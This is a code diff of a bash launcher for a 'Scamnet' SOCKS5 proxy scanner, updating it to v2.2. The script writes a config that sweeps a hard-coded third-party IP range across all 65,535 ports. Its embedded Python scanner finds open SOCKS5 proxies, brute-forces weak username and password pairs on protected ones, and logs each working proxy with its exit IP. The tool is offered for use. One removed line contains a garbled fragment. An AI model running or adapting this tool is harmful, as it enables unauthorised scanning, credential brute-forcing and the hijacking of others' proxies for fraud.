@@ -1,6 +1,6 @@
 #!/bin/bash
 # main.sh - Scamnet OTC SOCKS5 扫描器（完整自包含版）
-# 端口已改为默认 1-65535 全端口扫描
+# 端口已改为默认 1-65535 全端口扫描（已修复 !range 解析）
 # TG: @soqunla | GitHub: https://github.com/avotcorg/scamnet
 
 set -e
@@ -9,10 +9,9 @@ set -e
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
 LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
-
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }
 
-echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.1 (全端口 1-65535)${NC}"
+echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.2 (全端口 1-65535 - 修复 !range)${NC}"
 echo "日志 → $LOG"
 
 # ==================== 内嵌 requirements.txt ====================
@@ -65,43 +64,54 @@ download_or_create() {
 cat > config.yaml << 'EOF'
 # Scamnet 配置
 range: "157.254.32.0-157.254.52.255"
-ports: !range 1-65535    # 使用 !range 语法表示全端口
+ports: !range 1-65535    # 正确使用 !range 语法
 timeout: 6.0
 workers: 300
 EOF
 log "config.yaml 已创建（全端口 1-65535）"
 
-# ==================== 下载 scanner.py（支持 !range 语法）================
-download_or_create "https://raw.githubusercontent.com/avotcorg/scamnet/main/scanner.py" "scanner.py" "
-# scanner.py - 支持 !range 1-65535 全端口扫描
-import sys, os
-sys.path.append(os.path.dirname(__file__))
+# ==================== scanner.py（关键修复：支持 !range）================
+cat > scanner.py << 'PY'
+import sys, os; sys.path.append(os.path.dirname(__file__))
+import yaml
+from yaml import SafeLoader
 from plugins import load_plugins
 from concurrent.futures import ThreadPoolExecutor
-import socket, ipaddress, threading, time, yaml
+import socket, ipaddress, threading, time
 from tqdm import tqdm
 
-# 加载配置
+# ==================== 关键修复：注册 !range 构造器 ====================
+def range_constructor(loader, node):
+    value = loader.construct_scalar(node)
+    start, end = map(int, value.split('-'))
+    return list(range(start, end + 1))
+
+yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)
+
+# ==================== 加载配置 ====================
 with open('config.yaml') as f:
-    cfg = yaml.safe_load(f)
+    cfg = yaml.load(f, Loader=SafeLoader)
 
 INPUT_RANGE = cfg['range']
 RAW_PORTS = cfg['ports']
 TIMEOUT = cfg.get('timeout', 6.0)
 MAX_WORKERS = cfg.get('workers', 300)
 
-# 解析端口（支持 !range start-end）
-if isinstance(RAW_PORTS, str) and RAW_PORTS.startswith('!range '):
-    start, end = map(int, RAW_PORTS.split()[1].split('-'))
-    PORTS = list(range(start, end + 1))
+# 解析端口
+if isinstance(RAW_PORTS, list):
+    PORTS = RAW_PORTS
 else:
-    PORTS = RAW_PORTS if isinstance(RAW_PORTS, list) else [int(p) for p in RAW_PORTS]
+    print(f"[!] 端口解析失败，使用默认 [1080]")
+    PORTS = [1080]
 
-# 全局
+print(f"[DEBUG] 端口数量: {len(PORTS)} (期望: 65535)")
+
+# ==================== 全局变量 ====================
 file_lock = threading.Lock()
 valid_count = 0
 plugins = load_plugins()
 
+# ==================== 核心函数 ====================
 def test_proxy(ip: str, port: int):
     global valid_count
     result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
@@ -110,13 +120,15 @@ def test_proxy(ip: str, port: int):
         country = get_country(export_ip) or get_country(ip)
         result.update({'status':'OK', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip})
     else:
-        auth = plugins['auth_weak'].brute(ip, port) if 'auth_weak' in plugins else None
-        if auth:
-            user, pwd = auth
-            ok, latency, export_ip = is_socks5_available(ip, port, user, pwd)
-            if ok:
-                country = get_country(export_ip) or get_country(ip)
-                result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user चुन}:{pwd}'})
+        auth_mod = plugins.get('auth_weak')
+        if auth_mod:
+            auth = auth_mod.brute(ip, port)
+            if auth:
+                user, pwd = auth
+                ok, latency, export_ip = is_socks5_available(ip, port, user, pwd)
+                if ok:
+                    country = get_country(export_ip) or get_country(ip)
+                    result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user}:{pwd}'})
     plugins['output_file'].save_detail(result)
     if result['status'].startswith('OK'):
         valid_count += 1
@@ -128,25 +140,25 @@ def get_country(ip):
             return c
     return 'XX'
 
-def is_socks5_available(ip, port, user, pwd):
+def is_socks5_available(ip, port, user=None, pwd=None):
     try:
         with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
             sock.settimeout(TIMEOUT)
-            methods = b'\\x05\\x02\\x00\\x02' if user and pwd else b'\\x05\\x01\\x00'
+            methods = b'\x05\x02\x00\x02' if user and pwd else b'\x05\x01\x00'
             sock.sendall(methods)
             resp = sock.recv(2)
             if len(resp) != 2 or resp[0] != 5: return False,0,None
             method = resp[1]
             if method == 0: pass
             elif method == 2 and user and pwd:
-                auth = b'\\x01' + bytes([len(user)]) + user.encode() + bytes([len(pwd)]) + pwd.encode()
+                auth = b'\x01' + bytes([len(user)]) + user.encode() + bytes([len(pwd)]) + pwd.encode()
                 sock.sendall(auth)
                 if sock.recv(2)[1] != 0: return False,0,None
             else: return False,0,None
-            target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\\x00\\x50'
-            sock.sendall(b'\\x05\\x01\\x00\\x01' + target)
+            target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
+            sock.sendall(b'\x05\x01\x00\x01' + target)
             if sock.recv(10)[1] != 0: return False,0,None
-            sock.sendall(b'GET / HTTP/1.1\\r\\nHost: ifconfig.me\\r\\n\\r\\n')
+            sock.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
             resp = b''
             start = time.time()
             while time.time() - start < TIMEOUT:
@@ -154,20 +166,18 @@ def is_socks5_available(ip, port, user, pwd):
                     chunk = sock.recv(1024)
                     if not chunk: break
                     resp += chunk
-                    if b'\\r\\n\\r\\n' in resp: break
+                    if b'\r\n\r\n' in resp: break
                 except: break
-            export_ip = resp.split(b'\\r\\n\\r\\n',1)[1].decode(errors='ignore').split()[0] if b'\\r\\n\\r\\n' in resp else 'Unknown'
+            export_ip = resp.split(b'\r\n\r\n',1)[1].decode(errors='ignore').split()[0] if b'\r\n\r\n' in resp else 'Unknown'
             return True, round((time.time()-start)*1000), export_ip
     except: return False,0,None
 
+# ==================== 主函数 ====================
 def main():
     print('[OTC] 扫描启动')
-    if '/' in INPUT_RANGE:
-        ips = [str(ip) for ip in ipaddress.ip_network(INPUT_RANGE, strict=False).hosts()]
-    else:
-        start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
-        end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
-        ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
+    start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
+    end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
+    ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
     total = len(ips) * len(PORTS)
     print(f'IP: {len(ips):,}, 端口: {len(PORTS):,}, 总任务: {total:,}')
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
@@ -177,15 +187,14 @@ def main():
                 exe.submit(test_proxy, ip, port)
                 pbar.update(1)
         pbar.close()
-    print(f'\\n[+] 完成！发现 {valid_count} 个可用代理')
+    print(f'\n[+] 完成！发现 {valid_count} 个可用代理')
 
 if __name__ == '__main__': main()
-"
+PY
+log "scanner.py 已写入（支持 !range）"
 
-# ==================== 创建 plugins 目录 & 插件 ====================
+# ==================== 创建 plugins 目录 & 插件（保持不变）===================
 mkdir -p plugins
-
-# __init__.py
 cat > plugins/__init__.py << 'EOF'
 import importlib, os
 def load_plugins():
@@ -199,7 +208,6 @@ def load_plugins():
     return plugins
 EOF
 
-# auth_weak.py
 cat > plugins/auth_weak.py << 'EOF'
 WEAK_PASSWORDS = [
     "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
@@ -218,7 +226,6 @@ def brute(ip: str, port: int):
     return None
 EOF
 
-# geo_ipapi.py
 cat > plugins/geo_ipapi.py << 'EOF'
 import requests
 def get(ip: str):
@@ -233,7 +240,6 @@ def get(ip: str):
     return None
 EOF
 
-# output_file.py
 cat > plugins/output_file.py << 'EOF'
 import threading
 file_lock = threading.Lock()
